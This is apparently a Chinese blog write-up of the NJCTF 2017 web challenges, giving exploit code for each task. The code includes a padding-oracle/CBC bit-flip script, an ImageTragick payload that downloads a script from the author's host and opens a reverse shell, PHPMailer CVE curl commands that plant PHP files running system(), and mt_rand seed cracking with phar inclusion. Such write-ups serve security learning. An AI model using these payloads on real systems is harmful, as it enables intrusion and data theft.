+这里我将一句话写进<code style="max-width:100%;height:auto;">0.php</code>，压缩之后改名为0.png上传
+然后至于这里的<code style="max-width:100%;height:auto;">session_id()</code>，我们通过设置<code style="max-width:100%;height:auto;">Cookie: PHPSESSID=;</code>就能让它为空，所以得到随机数的md5，解开后的值为<code style="max-width:100%;height:auto;">732946980</code>，通过这个<code style="max-width:100%;height:auto;">http://download.openwall.net/pub/projects/php_mt_seed/</code>工具解开得到</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c51e00d16a9b0d6300000c.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后通过这份代码</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+    "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+    "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+    "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+    "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+$seed=138844507;
+mt_srand($seed);
+$ss = mt_rand();
+$str="";
+for ($i = 1; $i &lt;= 32; ++$i) {
+    $ch = mt_rand(0, count($set) - 1);
+    $str .= $set[$ch];
+}
+echo $str;
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">生成文件名的前一部分为<code style="max-width:100%;height:auto;">iT3Bip2WzUVhBITZPZrfTVeZjgmrK1DQ</code>，加上我们上传的<code style="max-width:100%;height:auto;">0.png</code>,所以完整的文件路径为<code style="max-width:100%;height:auto;">/uP1O4Ds/iT3Bip2WzUVhBITZPZrfTVeZjgmrK1DQ_0.png</code>，然后访问
+<code style="max-width:100%;height:auto;">http://218.2.197.235:23735/?page=phar://uP1O4Ds/iT3Bip2WzUVhBITZPZrfTVeZjgmrK1DQ_0.png/0</code>，最后执行命令即可拿到flag。
+如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c51f67d16a9b0d6300000d.png" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./NJCTF-2017-web-Writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="njctf2017webwriteup">NJCTF 2017 web Writeup</h1>
+<p style="max-width:100%;height:auto;">第一次做题做到差点吐血，好多web啊。。。。最后有两个还没有做出来，一道是<code style="max-width:100%;height:auto;">come on</code>，注入题，始终觉得返回值太诡异了，看不懂，于是giveup，一道是ruby拿道，不会ruby，最后也没时间去看了，所以就抛弃了。回头去看大佬们的题解了只能。总之题目质量还是可以的。</p>
+<h2 id="web100login">web100 Login</h2>
+<p style="max-width:100%;height:auto;">第一题找到这个登陆界面随便注册一个登进去之后发现在<code style="max-width:100%;height:auto;">getflag.php</code>界面下有打印了自己的用户名。第一反应是二次注入，随便构造一个提交发现注册成功，而且我多点几次任然注册成功，因为用户名不能重复的，所以想到这里有长度限制试了下发现是50，所以这样就可以想办法重置admin的密码，如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c357612c302e04bd000000.png" style="max-width:100%;height:auto;"/><br/>
+这样就成功重置admin的密码，登进去就拿到flag了。</p>
+<h2 id="web100getflag">web100 Get Flag</h2>
+<p style="max-width:100%;height:auto;">这里随便输入观察下发现服务器会cat你输入的东西，那么很好办，直接用<code style="max-width:100%;height:auto;">&amp;</code>来进行执行自己的命令就好了，这里<code style="max-width:100%;height:auto;">;</code>什么的都被过滤了。
+然后就不停的向上<code style="max-width:100%;height:auto;">ls</code>最终<code style="max-width:100%;height:auto;">flag</code>在服务器的根目录下面，如下图：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c361b9e24abc5d60000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web300beadmin">web300 Be Admin</h2>
+<p style="max-width:100%;height:auto;">首先通过备份文件拿到源代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+error_reporting(0);
+define("SECRET_KEY", "......");
+define("METHOD", "aes-128-cbc");
+
+session_start();
+
+function get_random_token(){
+    $random_token=&amp;apos;&amp;apos;;
+    for($i=0;$i&lt;16;$i++){
+        $random_token.=chr(rand(1,255));
+    }
+    return $random_token;
+}
+
+function get_identity()
+{
+    global $defaultId;
+    $j = $defaultId;
+    $token = get_random_token();
+    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);
+    $_SESSION[&amp;apos;id&amp;apos;] = base64_encode($c);
+    setcookie("ID", base64_encode($c));
+    setcookie("token", base64_encode($token));
+    if ($j === &amp;apos;admin&amp;apos;) {
+        $_SESSION[&amp;apos;isadmin&amp;apos;] = true;
+    } else $_SESSION[&amp;apos;isadmin&amp;apos;] = false;
+
+}
+
+function test_identity()
+{
+    if (!isset($_COOKIE["token"]))
+        return array();
+    if (isset($_SESSION[&amp;apos;id&amp;apos;])) {
+        $c = base64_decode($_SESSION[&amp;apos;id&amp;apos;]);
+        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {
+            if ($u === &amp;apos;admin&amp;apos;) {
+                $_SESSION[&amp;apos;isadmin&amp;apos;] = true;
+            } else $_SESSION[&amp;apos;isadmin&amp;apos;] = false;
+        } else {
+            die("ERROR!");
+        }
+    }
+}
+
+function login($encrypted_pass, $pass)
+{
+    $encrypted_pass = base64_decode($encrypted_pass);
+    $iv = substr($encrypted_pass, 0, 16);
+    $cipher = substr($encrypted_pass, 16);
+    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
+    return $password == $pass;
+}
+
+
+
+function need_login($message = NULL) {
+    echo "   &lt;!doctype html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+        &lt;meta charset=\"UTF-8\"&gt;
+        &lt;title&gt;Login&lt;/title&gt;
+        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;
+            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;
+        &lt;/head&gt;
+        &lt;body&gt;";
+    if (isset($message)) {
+        echo "  &lt;div&gt;" . $message . "&lt;/div&gt;\n";
+    }
+    echo "&lt;form method=\"POST\" action=&amp;apos;&amp;apos;&gt;
+            &lt;div class=\"body\"&gt;&lt;/div&gt;
+                &lt;div class=\"grad\"&gt;&lt;/div&gt;
+                    &lt;div class=\"header\"&gt;
+                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;
+                    &lt;/div&gt;
+                    &lt;br&gt;
+                    &lt;div class=\"login\"&gt;
+                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;
+                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;               
+                        &lt;input type=\"submit\" value=\"Login\"&gt;
+                    &lt;/div&gt;
+                     &lt;script src=&amp;apos;http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&amp;apos;&gt;&lt;/script&gt;
+            &lt;/form&gt;
+        &lt;/body&gt;
+    &lt;/html&gt;";
+}
+
+function show_homepage() {
+    echo "&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;";
+    global $flag;
+    printf("Hello ~~~ ctfer! ");
+    if ($_SESSION["isadmin"])
+        echo $flag;
+    echo "&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;";
+
+}
+
+if (isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;password&amp;apos;])) {
+    $username = (string)$_POST[&amp;apos;username&amp;apos;];
+    $password = (string)$_POST[&amp;apos;password&amp;apos;];
+    $query = "SELECT username, encrypted_pass from users WHERE username=&amp;apos;$username&amp;apos;";
+    $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . "[$query]");
+    if ($row = $res-&gt;fetch_assoc()) {
+        $uname = $row[&amp;apos;username&amp;apos;];
+        $encrypted_pass = $row["encrypted_pass"];
+    }
+
+    if ($row &amp;&amp; login($encrypted_pass, $password)) {
+        echo "you are in!" . "&lt;/br&gt;";
+        get_identity();
+        show_homepage();
+    } else {
+        echo "&lt;script&gt;alert(&amp;apos;login failed!&amp;apos;);&lt;/script&gt;";
+        need_login("Login Failed!");
+    }
+
+} else {
+    test_identity();
+    if (isset($_SESSION["id"])) {
+        show_homepage();
+    } else {
+        need_login();
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">初步观察和<code style="max-width:100%;height:auto;">secconctf2016 biscuiti</code>的源代码有点类似，进过观察分析之后初步确定思路，首先我们知道加密后的ID,也就是密文，以及token,也就是初始向量，然后我们的目的是要提交token使ID解出来为<code style="max-width:100%;height:auto;">admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b</code>(PS:加密填充之后)，这样子就会是<code style="max-width:100%;height:auto;">admin</code>的值就能成功绕过验证，而要达到这样的目的我们首先需要通过<code style="max-width:100%;height:auto;">padding oracle</code>拿到ID对应的明文，然后进行CBC字节翻转攻击，从而实现目标，相比与<code style="max-width:100%;height:auto;">secconctf2016 biscuiti</code>要相对简单，但是中间遇到各式各样的问题，譬如请求提交的时候自己习惯性的先<code style="max-width:100%;height:auto;">r=request.session()</code>，在这里反倒起了反作用。另外要说的是这道题的服务器肯定有毒，我开始死活跑步出来，查错查了俩小时没发现问题，最后实在受不了了，把所有代码框起来<code style="max-width:100%;height:auto;">while 1</code>，过了会就拿到<code style="max-width:100%;height:auto;">flag</code>了，擦，报警了。
+其实最开始我的思路是在<code style="max-width:100%;height:auto;">test_identity</code>那里触发解密进行<code style="max-width:100%;height:auto;">padding oracle</code>攻击，不过这样来说就只能爆破15位，最后一位无法得到，不过可以通过枚举来尝试，但是由于服务器的锅这样有点慢，所以我还是换成在login那里触发，不过都一样，只要能触发解密控制iv就能进行<code style="max-width:100%;height:auto;">padding oracle</code>。
+下面是代码，直接运行即可得到flag：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import base64
+import time
+url=&amp;apos;http://218.2.197.235:23737/&amp;apos;
+#url=&amp;apos;http://127.0.0.1:8000&amp;apos;
+N=16
+phpsession=""
+ID=""
+def inject1(password):
+    param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;{password}".format(password=password),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
+    result=requests.post(url,data=param)
+    #print result.content
+    return result
+
+def inject_token(token):
+    header={"Cookie":"PHPSESSID="+phpsession+";token="+token+";ID="+ID}
+    result=requests.post(url,headers=header)
+    return result
+
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+
+def pad(string,N):
+    l=len(string)
+    if l!=N:
+        return string+chr(N-l)*(N-l)
+
+def padding_oracle(N,cipher):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=chr(0)*(16-i)+chr(j)+padding+cipher
+            print c.encode(&amp;apos;hex&amp;apos;)
+            result=inject1(base64.b64encode(chr(0)*16+c))
+            if "ctfer" not in result.content:
+                get=chr(j^i)+get
+                time.sleep(0.1)
+                break
+    return get
+
+session=inject1("bendawang").headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;,&amp;apos;)
+phpsession=session[0].split(";")[0][10:]
+print phpsession
+ID=session[1][4:].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+token=session[2][6:].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
+
+middle=""
+middle=padding_oracle(N,ID)
+print "ID:"+ID.encode(&amp;apos;base64&amp;apos;)
+print "token:"+token.encode(&amp;apos;base64&amp;apos;)
+print "middle:"+middle.encode(&amp;apos;base64&amp;apos;)
+print "\n"
+if(len(middle)==16):
+    plaintext=xor(middle,token);
+    print plaintext.encode(&amp;apos;base64&amp;apos;)
+    des=pad(&amp;apos;admin&amp;apos;,N)
+    tmp=""
+    print des.encode("base64")
+    for i in xrange(16):
+        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
+    print tmp.encode(&amp;apos;base64&amp;apos;)
+
+    result=inject_token(base64.b64encode(tmp))
+    print result.content
+    if "flag" in result.content or "NJCTF" in result.content or &amp;apos;njctf&amp;apos; in result.content:
+        input("success")
+</code></pre>
+<p style="max-width:100%;height:auto;">运行截图如下所示：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c3acb7e24abc5d60000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web350textwall">web350 Text wall</h2>
+<p style="max-width:100%;height:auto;">首先同样是通过备份文件<code style="max-width:100%;height:auto;">.index.php.swo</code>拿到部分源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$lists = [];
+Class filelist{
+    public function __toString()
+    {
+        return highlight_file(&amp;apos;hiehiehie.txt&amp;apos;, true).highlight_file($this-&gt;source, true);
+    }
+}
+//.....
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">看到源码之后想到是个反序列化，根据<code style="max-width:100%;height:auto;">__toString</code>的触发条件构造如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+Class filelist{
+    public function __toString()
+    {
+        return highlight_file(&amp;apos;hiehiehie.txt&amp;apos;, true).highlight_file($this-&gt;source, true);
+    }
+}
+//.....
+$a = new filelist();
+$b= new filelist();
+$b-&gt;source = &amp;apos;文件路径&amp;apos;;
+$a-&gt;source=$b;
+$d=serialize($a);
+$e=sha1($d).$d;
+echo urlencode($e)."&lt;br&gt;";
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后就能读取文件内容，先读取的<code style="max-width:100%;height:auto;">index.php</code>,然后在里面得知flag的位置在<code style="max-width:100%;height:auto;">/var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g</code>，读取即获得flag，截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c3ae44e24abc5d60000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web300wallet">web300 Wallet</h2>
+<p style="max-width:100%;height:auto;">首先通过<code style="max-width:100%;height:auto;">http://218.2.197.235:23723/www.zip</code>拿到一个加密的压缩包，发现需要密码，后来猜到密码是<code style="max-width:100%;height:auto;">njctf2017</code>解开拿到加密之后的源代码，解密之后源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+require_once("db.php");
+$auth = 0;
+if (isset($_COOKIE["auth"])) {
+    $auth = $_COOKIE["auth"];
+    $hsh = $_COOKIE["hsh"];
+    if ($auth == $hsh) {
+        $auth = 0;
+    } else if (sha1((string)$hsh) == md5((string)$auth)) {
+        $auth = 1;
+    } else {
+        $auth = 0;
+    }
+} else {
+    $auth = 0;
+    $s = $auth;
+    setcookie("auth", $s);
+    setcookie("hsh", sha1((string)$s));
+}
+if ($auth) {
+    if (isset($_GET[&amp;apos;query&amp;apos;])) {
+        $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
+        $qstr = SQLITE3::escapeString($_GET[&amp;apos;query&amp;apos;]);
+        $query = "SELECT amount FROM my_wallets WHERE id=$qstr";
+        $result = $db-&gt;querySingle($query);
+        if (!$result === NULL) {
+            echo "Error - invalid query";
+        } else {
+            echo "Wallet contains: $result";
+        }
+    } else {
+        echo "&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name=&amp;apos;input&amp;apos; action=&amp;apos;admin.php&amp;apos; method=&amp;apos;get&amp;apos;&gt;Wallet ID: &lt;input type=&amp;apos;text&amp;apos; name=&amp;apos;query&amp;apos;&gt;&lt;input type=&amp;apos;submit&amp;apos; value=&amp;apos;Submit Query&amp;apos;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;";
+    }
+} else echo "Sorry, not authorized.";
+</code></pre>
+<p style="max-width:100%;height:auto;">然后发现一个比较<code style="max-width:100%;height:auto;">sha1((string)$hsh) == md5((string)$auth)</code>，想到弱类型，让两个都为<code style="max-width:100%;height:auto;">0e</code>开头的值即可，md5这样的很多，sha1的话需要先爆破，进过一番爆破找到一个<code style="max-width:100%;height:auto;">aaK1STfY</code>，然后就是一个数字型的sqlite注入，这里我直接脑洞出的，先是<code style="max-width:100%;height:auto;">select flag from flag</code>，不行，然后<code style="max-width:100%;height:auto;">select 1 from flag</code>，成功，再然后<code style="max-width:100%;height:auto;">select id from flag</code>，获得flag,哈哈，省去了一些麻烦事，脑洞万岁！！，最后截图如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c3be0de24abc5d60000003.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web400pictureswall">web400 picture&amp;apos;s wall</h2>
+<p style="max-width:100%;height:auto;">首先这里登陆的时候发现任何用户用任何密码都能随便登陆，然后进去又说是只有root能上传文件，它怎么区分是不是<code style="max-width:100%;height:auto;">root</code>呢？搞不懂，然后胡七八糟发现登陆的时候把<code style="max-width:100%;height:auto;">host</code>改了进去就能上传图片了，然后开始疯狂上传，上传的时候发现它对文件内容没有验证，然后过滤文件名的后缀方式是白名单，像是<code style="max-width:100%;height:auto;">phtml</code>啊,<code style="max-width:100%;height:auto;">phps</code>啊，<code style="max-width:100%;height:auto;">pht</code>啊之类的都能随便上传，访问之后发现它并不解析，只是打印，于是想到用<code style="max-width:100%;height:auto;">&lt;script&gt;</code>标签，成功上传执行，如下截图：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4bd95d16a9b0d63000000.png" style="max-width:100%;height:auto;"/><br/>
+最后获取<code style="max-width:100%;height:auto;">flag</code>如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4bda7d16a9b0d63000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web450belogical">web450 Be Logical</h2>
+<p style="max-width:100%;height:auto;">首先进去随便注册一个账户，然后发现自己有500分和0金币，而且二者互换比例是1比1，之后发现一个兑换之后的<code style="max-width:100%;height:auto;">refund</code>功能，我先用1积分兑然了1金币，之后在refund的时候我抓包把points改成了1e111111,结果竟然成功了，然后我的积分成了这样，晕，太大了，
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4f00fd16a9b0d63000002.png" style="max-width:100%;height:auto;"/><br/>
+重新注册一个账户再来一次，然后就有了很多分了，兑换1000购买服务，进去如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c4f045d16a9b0d63000003.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">它的功能就是把你上传的图片进行转化成别的格式，试了半天也没绕过，后来想到是不是<code style="max-width:100%;height:auto;">imagmagick</code>的命令执行漏洞,随便找了个poc如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">push graphic-context
+viewbox 0 0 640 480
+fill &amp;apos;url(https://example.com/image.jpg"|wget http://bendawang.site:8000/a.py -O /tmp/bendawang.py &amp;&amp; python /tmp/bendawang.py 104.160.43.154 12346")&amp;apos;
+pop graphic-context
+</code></pre>
+<p style="max-width:100%;height:auto;">上传，执行成功反弹shell,在机器上找了好久也没有flag，于是想到是不是在别的机器上呢，然后扫一下网段，发现1,19,43三台机器80端口开着，访问一下19，返回一个什么邮件系统，然后瞬间想到之前phpmailer那个cve漏洞，但是需要一个可写的目录，后来脑洞到了一个<code style="max-width:100%;height:auto;">uploads</code>，访问发现403，好的有了，开始尝试，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://172.17.0.19 -d "subject=aaaaa&amp;email=aaa( -X /var/www/html/uploads/bendawang.php -OQueueDirectory=/tmp )@qq.com&amp;message=&lt;?php phpinfo();?&gt;&amp;submit=Send email"
+</code></pre>
+<p style="max-width:100%;height:auto;">发现成功执行<code style="max-width:100%;height:auto;">phpinfo();</code>，然后就开始上传木马，传了半天传了各式各样的木马也不行，算了，直接看看目录文件把，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://172.17.0.19 -d &amp;apos;subject=aaaaa&amp;email=aaa( -X /var/www/html/uploads/bendawang5.php -OQueueDirectory=/tmp )@qq.com&amp;message=&lt;?php foreach (glob("../*") as $filename){echo $filename."&lt;br&gt;";};?&gt;&amp;submit=Send email&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">访问拿到目录下文件如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">../PHPMailer&lt;br&gt;../flaaaaaaag.php&lt;br&gt;../index.php&lt;br&gt;../uploads&lt;br&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后直接获取文件内容就可以了，先是用<code style="max-width:100%;height:auto;">file_get_content</code>,失败，后来直接<code style="max-width:100%;height:auto;">system</code>，成功，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://172.17.0.19 -d &amp;apos;subject=aaaaa&amp;email=aaa( -X /var/www/html/uploads/bendawang9.php -OQueueDirectory=/tmp )@qq.com&amp;message=&lt;?php system("cat ../flaaaaaaag.php");?&gt;&amp;submit=Send email&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到文件内容如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php $flag="NJCTF{y0U_r_A_G00oD_PeNt35T3r!}";?&gt;
+</code></pre>
+<h2 id="web350chall1">web350 chall1</h2>
+<p style="max-width:100%;height:auto;">首先是这道题的感觉，在这里发现了类似的题通过buffer来泄露内存<code style="max-width:100%;height:auto;">https://www.smrrd.de/nodejs-hacking-challenge-writeup.html</code>，但是怎么试了都不行，后来去github上随便搜一搜结果发现了源码
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c5087dd16a9b0d63000004.png" style="max-width:100%;height:auto;"/><br/>
+然后关键部分如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">....
+var reg = /^[0-9]*$/;
+....
+....
+router.post(&amp;apos;/login&amp;apos;, function(req, res, next) {
+    if(req.body.password !== undefined) {
+        var endata = crypto.createHash(&amp;apos;md5&amp;apos;).update(req.body.password).digest("hex");
+        if (reg.test(endata)) {
+            var pwd = parseInt(endata.slice(0,3),10);
+            password = new Buffer(pwd);
+            if(password.toString(&amp;apos;base64&amp;apos;) == config.secret_password) {
+                req.session.admin = &amp;apos;yes&amp;apos;;
+                res.json({&amp;apos;status&amp;apos;: &amp;apos;ok&amp;apos; });
+            }else{
+                res.json({&amp;apos;status&amp;apos;: &amp;apos;error&amp;apos;, &amp;apos;error&amp;apos;: &amp;apos;password wrong: &amp;apos;+password.toString()});
+            }
+        }else{
+            res.json({&amp;apos;status&amp;apos;: &amp;apos;error&amp;apos;, &amp;apos;error&amp;apos;: &amp;apos;password wrong: &amp;apos;+endata.toString()});
+        }
+    } else {
+        res.json({&amp;apos;status&amp;apos;: &amp;apos;error&amp;apos;, &amp;apos;error&amp;apos;: &amp;apos;password missing&amp;apos; });
+    }
+});
+</code></pre>
+<p style="max-width:100%;height:auto;">也就是说要找一个MD5之后的值全是0-9就好了，爆破之后找到了一个<code style="max-width:100%;height:auto;">2PP7</code>，然后发送请求如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50957d16a9b0d63000005.png" style="max-width:100%;height:auto;"/><br/>
+成功泄露内存数据，疯狂尝试之后成功拿到flag
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50986d16a9b0d63000006.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web450chall2">web450 chall2</h2>
+<p style="max-width:100%;height:auto;">根据第一个拿到的flag,将他作为<code style="max-width:100%;height:auto;">session_keys</code>
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50cb8d16a9b0d63000008.png" style="max-width:100%;height:auto;"/><br/>
+修改源码里面的<code style="max-width:100%;height:auto;">app.js</code>的为<code style="max-width:100%;height:auto;">req.session.admin = &amp;apos;yes&amp;apos;;</code>，然后访问获得<code style="max-width:100%;height:auto;">session.sig</code>
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50d05d16a9b0d63000009.png" style="max-width:100%;height:auto;"/><br/>
+然后修改cookie登陆即可
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50d21d16a9b0d6300000a.png" style="max-width:100%;height:auto;"/><br/>
+base64解密之后<br/>
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c50d51d16a9b0d6300000b.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web250guess">web250 Guess</h2>
+<p style="max-width:100%;height:auto;">首先是通过文件包含直接获取源码，<code style="max-width:100%;height:auto;">upload.php</code>的源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+error_reporting(0);
+function show_error_message($message)
+{
+    die("&lt;div class=\"msg error\" id=\"message\"&gt;
+    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");
+}
+
+function show_message($message)
+{
+    echo("&lt;div class=\"msg success\" id=\"message\"&gt;
+    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");
+}
+
+function random_str($length = "32")
+{
+    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $str = &amp;apos;&amp;apos;;
+
+    for ($i = 1; $i &lt;= $length; ++$i) {
+        $ch = mt_rand(0, count($set) - 1);
+        $str .= $set[$ch];
+    }
+
+    return $str;
+}
+
+session_start();
+
+$reg=&amp;apos;/gif|jpg|jpeg|png/&amp;apos;;
+if (isset($_POST[&amp;apos;submit&amp;apos;])) {
+    //10822560
+    $seed = rand(0,999999999);
+    mt_srand($seed);
+    $ss = mt_rand();
+    $hash = md5(session_id() . $ss);
+    setcookie(&amp;apos;SESSI0N&amp;apos;, $hash, time() + 3600);
+
+    if ($_FILES["file"]["error"] &gt; 0) {
+        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
+    }
+    $check1 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
+            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
+            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
+            || ($_FILES["file-upload-field"]["type"] == "image/png"))
+        &amp;&amp; ($_FILES["file-upload-field"]["size"] &lt; 204800));
+    $check2=!preg_match($reg,pathinfo($_FILES[&amp;apos;file-upload-field&amp;apos;][&amp;apos;name&amp;apos;], PATHINFO_EXTENSION));
+
+
+    if ($check2) show_error_message("Nope!");
+    if ($check1) {
+        $filename = &amp;apos;./uP1O4Ds/&amp;apos; . random_str() . &amp;apos;_&amp;apos; . $_FILES[&amp;apos;file-upload-field&amp;apos;][&amp;apos;name&amp;apos;];
+        if (move_uploaded_file($_FILES[&amp;apos;file-upload-field&amp;apos;][&amp;apos;tmp_name&amp;apos;], $filename)) {
+            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
+        } else show_error_message("Something wrong with the upload...");
+    } else {
+        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
+    }
+}
+?&gt;
+</code></pre>
